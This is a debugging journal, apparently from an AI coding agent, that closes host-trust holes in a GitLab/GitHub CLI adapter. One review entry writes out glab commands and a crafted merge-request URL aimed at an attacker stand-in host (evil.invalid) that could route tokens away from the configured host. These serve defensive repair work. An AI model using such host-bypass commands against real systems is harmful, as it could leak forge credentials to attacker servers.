# Journal: 2026-10-06-glab-host-trust

<!-- fr:journal kind=repro scope=debug id=366819be5164 created=2026-10-06T13:40:43+00:00 -->
### 366819be5164 · repro · Three holes in #994's host trust seam (gh#1014, gh#1015, gh#1013)

Read, not run against a forge (the gaps are structural). (1) gh#1014: RealGlabClient(host=h) threads GITLAB_HOST=h into every glab call with no check that glab is logged into h; h comes from MR URLs and a cloned repo's committed fr-profiles.yaml. (2) gh#1015: real_ghclient._gh_runner(run) returns an injected runner unchanged, so isolation's default_branch / pr_for_branch run gh with no GH_HOST after @_hosted's gate passed; RealGlabClient.default_branch / pr_for_branch apply no GITLAB_HOST on either runner. (3) gh#1013: hostclient.forge_error_kind hands a GhHostRefusedError to fr.gh._classify_error as text; a refused host named e.g. git.timeout.example reads as 'warn' (transient) and gh.is_transient retries it.

<!-- fr:journal kind=root-cause scope=debug id=fdd54a21e4af created=2026-10-06T13:40:49+00:00 -->
### fdd54a21e4af · root-cause · Host trust is fr.gh-private, not a forge-adapter contract

#994 put the whole contract (gate + host env) in fr.gh._env(), reachable only from fr.gh's own subprocess paths and the gh adapter's DEFAULT runner. Every part of the seam outside that one function lacks it: the glab adapter (no gate), an injected CommandRunner (no host env: the protocol has no env parameter, so the host cannot be handed to it), and the classifier (sees a refusal as stderr text, not as its type). One cause, three symptoms; the fix makes the contract the adapters': a typed HostRefusedError both backends' refusals inherit, a host env overlay every runner receives, a glab gate reading the config file glab itself reads.

<!-- fr:journal kind=finding scope=debug id=host-trust-adapter-contract created=2026-10-06T14:03:58+00:00 state=fixed -->
### host-trust-adapter-contract · finding [fixed] · Host trust made the adapters' contract (commit 4c97e80a8)

Failing test first (2ad95e47f, tests/unit/test_forge_host_trust.py), then: fr.ghclient.HostRefusedError (forge-neutral; GhHostRefusedError and the new GlabHostRefusedError inherit it); CommandRunner carries an env overlay; fr.gh.host_env / fr.glab.host_env are each backend's one gate; RealGlabClient @_hosted on all 16 public methods; isolation's runners apply the overlay on top of their own env (_forge_runner, run_network extra_env); forge_error_kind / gh.classify / is_transient / glab.is_not_found check the type first. Also: client_for_backend no longer threads gitlab.com (as for github.com). Found while fixing: glab 1.89 reads ~/.config/glab-cli AHEAD of $XDG_CONFIG_HOME (probed live) — not gh's order; the gate follows glab's. Existing glab tests now log glab into their fixture host, as gh's already did. Full suite 9219 passed; mypy, ruff, acceptance check, validate artifacts, change-fragment all green.

<!-- fr:journal kind=finding scope=debug id=glab-repo-arg-host-bypass created=2026-10-06T14:10:43+00:00 state=open review_scope=in -->
### glab-repo-arg-host-bypass · finding [open] (reviewer: in scope) · Review: glab --repo URL / git@ form bypasses the host gate

Adversarial review, confirmed live against glab 1.89 (.invalid hosts, dummy token): `glab mr view 1 --repo https://evil.invalid/g/p` and `--repo git@evil.invalid:g/p.git` call https://evil.invalid/api/v4/... whatever GITLAB_HOST says; `glab api https://evil.invalid/...` likewise. Plain 3/4-part paths stay on the configured host; a positional URL to `mr view` does not switch host. Reachable: _MR_URL_RE's lazy (.+?) captures 'https://evil.invalid/g/p' from 'https://gitlab.com/https://evil.invalid/g/p/-/merge_requests/1' (fr_vk.pr_observe from a card's latest_pr_url), and any repo forwarded to --repo from a card title. Also ruled out (live): my uncommitted pin of gitlab.com as GITLAB_HOST — with no GITLAB_HOST glab REFUSES a remote whose host it does not know, so dropping the SaaS host is safe; the pin was reverted.

<!-- fr:journal kind=finding scope=debug id=glab-repo-arg-host-bypass-resolved created=2026-10-06T14:16:52+00:00 state=fixed resolves=glab-repo-arg-host-bypass answered_by=agent -->
### glab-repo-arg-host-bypass-resolved · finding [fixed] · resolves glab-repo-arg-host-bypass: Review: glab --repo URL / git@ form bypasses the host gate

af50241a1: _run_glab refuses a --repo/-R URL or user@host: value and a full-URL api endpoint before any process; _MR_URL_RE excludes : and @; pr_status_by_url re-raises a refusal. Pinned by test_forge_host_trust.py (red first, then green); full suite 9231 passed.

<!-- fr:journal kind=review scope=debug id=7b1cdbbf98e9 created=2026-10-06T14:16:53+00:00 -->
### 7b1cdbbf98e9 · review · Adversarial review (independent agent, read-only): 1 blocker fixed, 1 should-fix resolved, 4 nits

1 BLOCKER, in scope — glab --repo URL/git@ and api-URL host bypass: fixed (af50241a1, finding glab-repo-arg-host-bypass). 2 SHOULD-FIX — my uncommitted gitlab.com pin rested on a false premise (live: with no GITLAB_HOST glab refuses an unknown remote host): pin reverted before commit; committed behaviour (SaaS host dropped, as client_for_url / pr_observe / gh do) kept. 3 NIT empty host: fixed ("" is no host). 4 NIT known_hosts docstring overstated "logged in": corrected (a key is an operator choice, never a clone's). 5 NIT adapters always pass env= to an injected runner: kept — the CommandRunner protocol now declares env, both in-repo injectors take it, and isolation's _forge_runner keeps the old bare call when no host. 6 NIT no suite-wide glab/gh config isolation in tests/conftest.py: not done here (latent, pre-existing for gh too). OUT OF SCOPE, reported to the operator, not filed: gh honours --repo HOST/OWNER/REPO the same way, sending GH_ENTERPRISE_TOKEN to any GHES host — the gh twin of the blocker, pre-existing.
